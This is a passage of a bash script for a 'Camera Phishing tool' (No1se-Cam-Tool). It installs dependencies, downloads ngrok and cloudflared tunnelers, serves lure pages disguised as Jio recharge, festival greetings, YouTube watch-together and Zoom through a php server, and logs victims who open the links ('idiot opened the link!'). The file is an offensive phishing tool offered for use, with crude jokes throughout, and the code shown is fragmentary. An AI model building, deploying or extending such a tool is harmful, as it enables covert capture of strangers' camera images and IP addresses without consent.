...
echo "Hello $Name,Admin Please dont Ban Me i have no Life"
sleep 3

# Logo 
logo="
${green}  | \ | | ___ / |___  ___   / ___|__ _ _ __ ___   |_   _|__   ___ | |
${cyan}|  \| |/ _ \| / __|/ _ \ | |   / _  |  _   _ \    | |/ _ \ / _ \| |
${purple}| |\  | (_) | \__ \  __/ | |__| (_| | | | | | |   | | (_) | (_) | |
${yellow}|_| \_|\___/|_|___/\___|  \____\__,_|_| |_| |_|   |_|\___/ \___/|_|
${red}                                            [v1.0]
${blue}                                    [By no1se]
"
# Package Installer
...
netcheck() {
    while true; do
        ...
        if [ "$?" != 0 ]; then
            echo -e "${error}$Name Tell your mom to not sit on the router THERE IS NOT INTERNET\007\n"
            sleep 2
        else
            break
        fi
...
replacer() {
    ...
    echo -e "${info}$Name Ok MY man sent one o those URLS for the pedo: \n"
    sleep 1
...
trap "echo -e '\n${success}$Name Come Back Later to catch more Pedos!\n'; exit" 2
...
if [ `command -v apt` ]; then
    ...
    echo -e "${error}$Name No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
...
if ! [ `command -v php` ]; then
    echo -e "${info}$Name Installing php...."
    $pac_man install php -y
    pacin php
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}$Name Installing curl...."
    $pac_man install curl -y
    pacin "unzip"
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}$Name Installing unzip...."
    $pac_man install unzip -y
    pacin "unzip"
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}$Name Installing wget...."
    $pac_man install wget -y
    pacin "wget"
fi
if $termux; then
if ! [ `command -v proot` ]; then
    echo -e "${info}$Name Installing proot...."
    pkg install proot -y
fi
if ! [ `command -v proot` ]; then
...
if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
    ...
    d=`uname`
    while true; do
        echo -e "\n${info}$Name Downloading Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
...
if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
    echo -e "\n${ask}$Name Enter your ngrok authtoken:"
    printf "${cyan}\nNo1se${nc}@${cyan}Tool ${red}$ ${nc}"
    read auth
    if [ -z $auth ]; then
        echo -e "\n${error}No authtoken!\n\007"
        sleep 1
...
echo -e "$logo"
sleep 1
echo -e "${ask}$Name PLease choose an option

${cyan}[${white}1${cyan}] ${yellow}Jio Recharge
${cyan}[${white}2${cyan}] ${green}Festival
${cyan}[${white}3${cyan}] ${red}Live Youtube (Is Like watch together)
${cyan}[${white}4${cyan}] ${blue}ZOOM(work graet for idiots)
${cyan}[${white}i${cyan}] ${purple}Change Image Directory (current: ${white}${FOL}${blue})
${cyan}[${white}t${cyan}] ${purple}Change Default Tunneler (current: ${white}${TN}${blue})
${cyan}[${white}x${cyan}] ${white}About
${cyan}[${white}m${cyan}] ${violate}All of my websites
...
# Select template
    if echo $option | grep -q "1"; then
        ...
        dir="fest"
        printf "\n${ask}$Name Enter festival name:${cyan}\n\nNo1se${nc}@${cyan}Tool ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}$Name What are you doing this is not an option!\n\007"
            sleep 1
        else
        ...
        dir="live"
        printf "\n${ask}$Name Enter youtube video ID:${cyan}\n\nNo1se${nc}@${cyan}Tool ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}$Name What are you doing this is not an option!\n\007"
            sleep 1
        ...
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[No1se-Cam-Tool]
$red[Version]    ${cyan} :[1.0]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[No1se] 
$red[Email]      ${cyan} :[yosiga3@gmail.com]"
printf "${cyan}\nNo1se${nc}@${cyan}Tool ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://no1seplayground.netlify.app/"
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}$Name What are you doing!\007"
        sleep 1
    fi
done
cd $cwd
...
if $termux; then
echo -e "\n${info}$Name If you haven't turned on hotspot, please enable it!"
sleep 3
fi
echo -e "\n${info}$Name Starting php server at localhost:7777....\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${info}$Name Starting tunnelers......\n"
...
if ( $cfcheck && $ngrokcheck ); then
    if [ $TN == "Cloudflared" ]; then
        echo -e "${success}$Name GO GET HIM Cloudflared choosen!\n"
        replacer "$cflink"
    else
...
if echo "$status" | grep -q "404"; then
    ...
    echo -e "${success}$Name PHP started succesfully!\n"
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for Idiot. $Name ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}idiot opened the link!\n"
